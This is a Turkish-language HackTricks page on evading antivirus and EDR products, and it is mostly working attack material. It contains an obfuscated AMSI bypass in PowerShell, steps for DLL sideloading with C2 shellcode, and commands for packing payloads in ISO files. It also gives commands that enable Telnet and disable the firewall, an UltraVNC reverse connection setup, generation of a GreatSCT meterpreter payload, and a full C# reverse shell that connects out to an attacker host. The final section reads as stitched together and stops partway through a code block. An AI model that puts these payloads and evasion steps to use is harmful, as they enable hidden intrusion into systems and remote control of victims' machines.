# Antivirüs (AV) Atlama

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>

**Bu sayfa** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** tarafından yazılmıştır!**

## **AV Atlama Metodolojisi**

Şu anda, AV'ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranış analizi.

### **Statik tespit**

Statik tespit, bir ikili veya komut dosyasındaki bilinen zararlı dizeleri veya baytlarını işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (örneğin, dosya açıklaması, şirket adı, dijital imzalar, simge, kontrol toplamı vb.) elde edilir. Bu, bilinen genel araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve zararlı olarak işaretlenmişlerdir. Bu tür bir tespiti atlatmanın birkaç yolu vardır:

* **Şifreleme**

Eğer ikiliyi şifrelerseniz, AV'nin programınızı tespit etme şansı olmayacaktır, ancak programı bellekte şifre çözme ve çalıştırma için bir yükleyiciye ihtiyacınız olacaktır.

* **Gizleme**

Bazen yapmanız gereken tek şey, ikili veya komut dosyanızdaki bazı dizeleri değiştirmek, böylece AV'yi atlatmak mümkün olabilir, ancak bunu gizlemek istediğiniz şeye bağlı olarak zaman alıcı bir görev olabilir.

* **Özel araçlar**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.

{% hint style="info" %}
Windows Defender'ın statik tespitine karşı kontrol etmek için iyi bir yol [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'dir. Bu, dosyayı birden çok segmente böler ve ardından Defender'a her birini ayrı ayrı taramasını ister, bu şekilde, ikili dosyanızdaki işaretlenmiş dizeleri veya baytları tam olarak söyleyebilir.
{% endhint %}

Pratik AV Atlama hakkında bu [YouTube çalma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kesinlikle kontrol etmenizi öneririm.

### **Dinamik analiz**

Dinamik analiz, AV'nin ikili dosyanızı bir kum havuzunda çalıştırması ve zararlı faaliyetleri izlemesi (örneğin, tarayıcınızın parolalarını şifre çözmeye ve okumaya çalışmak, LSASS üzerinde bir minidump yapmak vb.). Bu bölüm biraz daha karmaşık olabilir, ancak kum havuzlarını atlatabilmek için yapabileceğiniz bazı şeyler vardır.

* **Çalışmadan önce uyuma** Uygulamanın nasıl uygulandığına bağlı olarak, AV'nin dinamik analizini atlatmanın harika bir yoludur. AV'lerin dosyaları tarayabilmesi için çok kısa bir süreleri vardır, bu nedenle uzun süreli uyku kullanmak, ikili dosyaların analizini bozabilir. Ancak sorun şudur ki, birçok AV kum havuzları, uygulamanın nasıl uygulandığına bağlı olarak uykuyu atlayabilir.
* **Makinenin kaynaklarını kontrol etme** Genellikle Kum havuzlarının çalışması için çok az kaynakları vardır (örneğin, <2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz, örneğin CPU'nun sıcaklığını veya hatta fan hızlarını kontrol ederek, her şey kum havuzunda uygulanmayabilir.
* **Makineye özgü kontroller** "contoso.local" alanına katılmış bir iş istasyonuna hedeflenmek istiyorsanız, bilgisayarın alanını kontrol ederek belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz, eşleşmiyorsa programınızı sonlandırabilirsiniz.

Microsoft Defender'ın Kum havuzu bilgisayar adının HAL9TH olduğu ortaya çıktı, bu yüzden zararlı yazılımınızı patlatmadan önce bilgisayar adını kontrol edebilirsiniz, eğer ad HAL9TH ile eşleşiyorsa, bu, Defender'ın kum havuzunda olduğunuz anlamına gelir, bu yüzden programınızı sonlandırabilirsiniz.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)'den Kum havuzlarına karşı bazı gerçekten iyi ipuçları

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu gönderide daha önce söylediğimiz gibi, **genel araçlar** sonunda **tespit edilecektir**, bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS'ı dökmek istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa daha az bilinen ve aynı şekilde LSASS'ı döken farklı bir projeyi mi kullanabilirsiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz'ı bir örnek olarak alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen zararlı yazılım parçalarından biridir, projenin kendisi süper harika olsa da, AV'leri atlatabilmek için onunla çalışmak da bir kabus olabilir, bu yüzden elde etmek istediğiniz sonuca ulaşmak için alternatiflere bakın.

{% hint style="info" %}
Atlama için yüklerinizi değiştirirken, lütfen Defender'da **otomatik örnek göndermeyi kapatmayı** ve lütfen, ciddi anlamda, **VIRUSTOTAL'E YÜKLEMEYİNİZ**. Eğer amacınız uzun vadede atlama elde etmekse, yükünüzün belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bunu bir sanal makineye yükleyin, otomatik örnek göndermeyi kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.
{% endhint %}

##
## DLL Yan Yükleme ve Proxy

**DLL Yan Yükleme**, yükleyici tarafından kullanılan DLL arama sırasından faydalanır ve hem kurban uygulamasını hem de kötü amaçlı yükleri birlikte konumlandırır.

DLL Yan Yükleme'ye duyarlı programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell komut dosyasını kullanarak kontrol edebilirsiniz:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içinde DLL hijacking'e duyarlı olan programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktı olarak verecektir.

DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi şiddetle öneririm, bu teknik doğru bir şekilde uygulandığında oldukça gizlidir, ancak genel olarak bilinen DLL Sideloadable programlarını kullanırsanız, kolayca yakalanabilirsiniz.

Sadece bir programın yüklemeyi beklediği bir DLL ile kötü niyetli bir DLL yerleştirmek, yüklemeniz gerçekleşmeyecektir, çünkü program, bu DLL içinde belirli bazı işlevleri beklemektedir. Bu sorunu çözmek için, başka bir teknik olan **DLL Proxying/Forwarding** kullanacağız.

**DLL Proxying**, programın proxy (ve kötü niyetli) DLL'den yaptığı çağrıları orijinal DLL'ye yönlendirir, böylece programın işlevselliğini korur ve yüklemenizin gerçekleşmesini sağlar.

[@flangvik](https://twitter.com/Flangvik/) tarafından [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

Aşağıdaki adımları takip ettim:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Son komut bize 2 dosya verecektir: bir DLL kaynak kodu şablonu ve orijinal adı değiştirilmiş DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

İşte sonuçlar:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (SGN ile kodlanmış) hem de proxy DLL, [antiscan.me](https://antiscan.me) sitesinde 0/26 tespit oranına sahiptir! Bunu bir başarı olarak adlandırabilirim.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t'in twitch VOD](https://www.twitch.tv/videos/1644171543) videosunu ve [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG\_WNpE) izlemenizi **şiddetle tavsiye ederim**.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan sistem çağrıları ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmak için bir yük araç setidir`

Freeze'yi, shellcode'unuzu gizli bir şekilde yüklemek ve yürütmek için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Evasion sadece bir kedi ve fare oyunudur, bugün işe yarayan yarın tespit edilebilir, bu yüzden sadece bir araca güvenmeyin, mümkünse birden fazla kaçırma tekniğini birleştirmeyi deneyin.
{% endhint %}

## AMSI (Anti-Malware Tarama Arayüzü)

AMSI, "[dosyasız kötü amaçlı yazılım](https://en.wikipedia.org/wiki/Fileless\_malware)" önlemek için oluşturulmuştur. Başlangıçta, AV'ler yalnızca **diskteki dosyaları** tarama yeteneğine sahipti, bu yüzden payloads'ı **doğrudan bellekte** çalıştırabilirseniz, AV'nin bunu önlemek için yapabileceği bir şey yoktu, çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği, Windows'un bu bileşenlerine entegre edilmiştir.

* Kullanıcı Hesap Denetimi veya UAC (EXE, COM, MSI veya ActiveX yükseltme)
* PowerShell (komut dosyaları, etkileşimli kullanım ve dinamik kod değerlendirmesi)
* Windows Script Host (wscript.exe ve cscript.exe)
* JavaScript ve VBScript
* Office VBA makroları

Antivirüs çözümlerine, betik davranışını incelemelerine olanak tanır, betik içeriğini şifrelenmemiş ve şifrelenmemiş bir formda ortaya çıkarır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıyı üretecektir.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Dikkat edin, `amsi:` öne eklenir ve ardından betiğin çalıştığı yürütülebilir dosyanın yolu, bu durumda powershell.exe

Diskte herhangi bir dosya bırakmadık, ancak hala AMSI nedeniyle bellekte yakalandık.

AMSI'yi atlatmanın birkaç yolu vardır:

* **Obfuskasyon**

AMSI genellikle statik tespitlerle çalıştığından, yüklemeye çalıştığınız betikleri değiştirmek tespitten kaçınmanın iyi bir yol olabilir.

Ancak, AMSI, birden fazla katmana sahip olsa bile betikleri şifresini çözebilme yeteneğine sahiptir, bu nedenle obfuskasyon, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, kaçınmanın o kadar da basit olmadığı anlamına gelir. Bununla birlikte, bazen yapmanız gereken tek şey birkaç değişken adını değiştirmek olabilir, bu yüzden ne kadar bir şeyin işaretlendiğine bağlıdır.

* **AMSI Atlama**

AMSI, bir DLL'yi powershell (ayrıca cscript.exe, wscript.exe vb.) işlemine yükleyerek uygulanır, bu nedenle ayrıcalıklı olmayan bir kullanıcı olarak bile kolayca müdahale edilebilir. AMSI'nin uygulamasındaki bu kusur nedeniyle, araştırmacılar AMSI taramasını atlatmanın birden fazla yolunu bulmuşlardır.

**Hata Zorlama**

AMSI başlatmasını başarısız kılmak (amsiInitFailed), mevcut işlem için hiç tarama başlatılmayacağı anlamına gelir. İlk olarak bu, [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft daha geniş kullanımı önlemek için bir imza geliştirmiştir.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

AMSI'yi mevcut powershell işlemi için kullanılamaz hale getirmek için sadece bir satır powershell kodu gerekiyordu. Bu satır tabii ki AMSI tarafından işaretlendi, bu yüzden bu teknik kullanılmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) üzerinden aldığım değiştirilmiş AMSI bypass.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Bellekte Yama Yapma**

Bu teknik başlangıçta [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve kullanıcı tarafından sağlanan girişi tarayan amsi.dll'deki "AmsiScanBuffer" işlevinin adresini bulmayı ve bunu E\_INVALIDARG kodu için geri döndürecek talimatlarla üzerine yazmayı içerir. Bu şekilde, gerçek taramanın sonucu temiz bir sonuç olarak yorumlanan 0 olarak dönecektir.

{% hint style="info" %}
Daha detaylı bir açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.
{% endhint %}

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfayı**](basic-powershell-for-pentesters/#amsi-bypass) ve [bu repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) adresini kontrol edin.

Veya bellek yaması aracılığıyla her yeni Powershell betiğini yamalayan bu betik

## Obfuskasyon

C# açık metin kodunu **obfuskasyon** yapmak, derlemeleri derlemek için **metaprogramlama şablonları** oluşturmak veya derlenmiş derlemeleri **obfuskasyon** yapmak için kullanılabilecek birkaç araç vardır:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskatörü**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu proje, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir çatalını sağlayarak [kod obfuskasyonu](http://en.wikipedia.org/wiki/Obfuscation_(software)) ve değiştirilemezlik aracılığıyla artırılmış yazılım güvenliği sağlamayı amaçlamaktadır.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleyiciyi değiştirmeden ve harici bir araç kullanmadan, derleme zamanında obfuskasyonlu kod üretmek için `C++11/14` dilini nasıl kullanacağını gösterir.
* [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz zorlaştıracak olan C++ şablon metaprogramlama çerçevesi tarafından oluşturulan obfuskasyonlu işlemler katmanı ekleyin.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli farklı pe dosyalarını obfuskasyon yapabilen bir x64 ikili obfuskatördür.
* [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorfik kod motorudur.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için ince taneli bir kod obfuskasyon çerçevesidir. ROPfuscator, düzenli talimatları ROP zincirlerine dönüştürerek bir programı derleme kodu düzeyinde obfuskasyon yapar ve normal kontrol akışımızı engeller.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nim ile yazılmış bir .NET PE Crypter olan Nimcrypt
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'yi kabuk koduna dönüştürebilir ve ardından onları yükleyebilir

## SmartScreen ve MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumak için tasarlanmış bir güvenlik mekanizmasıdır.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen, temel olarak bir itibar tabanlı yaklaşımla çalışır, yani yaygın olarak indirilen uygulamalar SmartScreen'i tetikler ve böylece son kullanıcıya dosyayı çalıştırmadan önce uyarı verir ve engeller (ancak dosya yine de Daha Fazla Bilgi -> Yine de Çalıştır'a tıklayarak çalıştırılabilir).

**MoTW** (Mark of The Web), internetten dosya indirildiğinde otomatik olarak oluşturulan ve indirildiği URL ile birlikte Zone.Identifier adında bir [NTFS Alternatif Veri Akışı](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))'dır.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

{% hint style="info" %}
Önemli bir not olarak, **güvenilir** bir imzalama sertifikasıyla imzalanan yürütülebilir dosyaların **SmartScreen'i tetiklemediğini** belirtmek önemlidir.
{% endhint %}

Payload'larınızın Mark of The Web'i almaması için çok etkili bir yol, ISO gibi bir tür konteynerin içine paketlemektir. Bu, Mark-of-the-Web (MOTW)'ün **NTFS olmayan** birimlere uygulanamamasından kaynaklanır.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) Mark-of-the-Web'i atlatmak için payload'ları çıktı konteynerlerine paketleyen bir araçtır.

Örnek kullanım:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak ISO dosyalarının içine payload'ları yerleştirerek SmartScreen'i atlatma için bir demo.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Derlemesi Yansıtma

C# ikili dosyalarını belleğe yükleme uzun zamandır bilinmektedir ve hala AV tarafından yakalanmadan post-exploitation araçlarını çalıştırmanın harika bir yoludur.

Payload, disk dokunmadan doğrudan belleğe yükleneceği için, tüm süreç için AMSI'yi yamalamaktan başka bir şey düşünmemiz gerekmeyecek.

Çoğu C2 çerçevesi (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# derlemelerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

* **Fork\&Run**

Bu, **yeni bir fedakar süreç oluşturarak** post-exploitation kötü amaçlı kodunuzu bu yeni süreçe enjekte etmek, kötü amaçlı kodunuzu çalıştırmak ve işlem bittiğinde yeni süreci sonlandırmak anlamına gelir. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork ve çalıştır yönteminin avantajı, yürütmenin **Beacon implant sürecimiz dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şeyler yanlış gider veya yakalanırsa, **implantın hayatta kalma şansının çok daha yüksek** olması anlamına gelir. Dezavantajı, **Davranışsal Algılama** tarafından yakalanma olasılığının daha yüksek olmasıdır.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Bu, post-exploitation kötü amaçlı kodu **kendi sürecine enjekte etmek** ile ilgilidir. Bu şekilde, yeni bir süreç oluşturmanızı ve AV tarafından taranmasını önlemenizi sağlayabilirsiniz, ancak payload'unuzun yürütülmesiyle bir şeyler yanlış giderse, **beacon'ınızı kaybetme olasılığının çok daha yüksek** olduğu bir dezavantajı vardır.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C# Derlemesi yükleme hakkında daha fazla bilgi edinmek isterseniz, lütfen bu makaleyi kontrol edin: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

C# Derlemelerini **PowerShell'den** yükleyebilirsiniz, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) önerisinde belirtildiği gibi, saldırıya uğramış makineye **Saldırgan Kontrollü SMB paylaşımında yüklenmiş yorumlayıcı ortama** erişim sağlayarak diğer dilleri kullanarak kötü amaçlı kodu çalıştırmak mümkündür.

Yorumlayıcı İkili dosyalarına ve SMB paylaşımındaki ortama erişime izin vererek, saldırıya uğramış makinenin belleğinde bu dillerde **keyfi kodu çalıştırabilirsiniz**.

Repo, Defender'ın hala betikleri taradığını ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** sağladığını belirtiyor. Bu dillerdeki rastgele obfuskasyon olmayan ters kabuk betiklerinin test edilmesi başarılı olmuştur.

## Gelişmiş Kaçınma

Kaçınma çok karmaşık bir konudur, bazen bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekebilir, bu nedenle olgun ortamlarda tamamen algılanmadan kalmak neredeyse imkansızdır.

Karşılaştığınız her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha Gelişmiş Kaçınma tekniklerine daha fazla bilgi edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Ayrıca [@mariuszbit](https://twitter.com/mariuszbit) tarafından yapılan bu Evasion in Depth konuşması da harika.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı olarak bulduğunu kontrol edin**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz, bu, binary'nin **kötü amaçlı olarak bulduğu bölümleri kaldıracak** ve onları size ayıracaktır.\
Aynı şeyi yapan başka bir araç ise [**avred**](https://github.com/dobin/avred) ve hizmeti sunan açık bir web sitesi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistemin başlatıldığında **başlamasını** ve şimdi **çalışmasını** sağlayın:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştirme** (gizli) ve güvenlik duvarını devre dışı bırakma:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirme bağlantısı: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (kurulum değil, bin indirmek istersiniz)

**SUNUCUDA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

* _Disable TrayIcon_ seçeneğini etkinleştirin
* _VNC Password_ alanına bir şifre belirleyin
* _View-Only Password_ alanına bir şifre belirleyin

Ardından, _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **hedefin** içine taşıyın.

#### **Ters bağlantı**

**Saldırgan**, **sunucusunda** `vncviewer.exe -listen 5900` komutunu **çalıştırmalıdır** böylece ters **VNC bağlantısını** almak için **hazır** olur. Ardından, **hedefte**: winvnc daemon'ını başlatın `winvnc.exe -run` ve `winwnc.exe [-autoreconnect] -connect <saldırgan_ip>::5900` komutunu çalıştırın.

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

* Eğer `winvnc` zaten çalışıyorsa başlatmayın veya bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. `tasklist | findstr winvnc` komutuyla çalışıp çalışmadığını kontrol edin.
* Aynı dizinde `UltraVNC.ini` dosyası olmadan `winvnc` başlatmayın veya [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılacaktır.
* Yardım için `winvnc -h` komutunu çalıştırmayın veya bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz.

### GreatSCT

İndirme bağlantısı: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` komutunu kullanarak **lister'ı başlatın** ve **xml payload**'ı şu şekilde **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut savunucu işlemi çok hızlı bir şekilde sonlandıracaktır.**

### Kendi ters kabuğumuzu derlemek

https://medium.com/@Bank\_Security/algılanamayan-c-c-ters-kabuklar-fab4c0ec4f15

#### İlk C# Ters Kabuk

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Kullanımı:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Derleyici kullanarak C# 

Bir AV (Antivirüs) çözümünü atlatmanın bir yolu, C# kodunu derleyici kullanarak çalıştırmaktır. Bu, AV çözümünün statik analizini atlatmanın etkili bir yoludur. İşte bu yöntemi kullanarak nasıl bir AV bypass yapabileceğinizi gösteren bir örnek:

```csharp
using System;
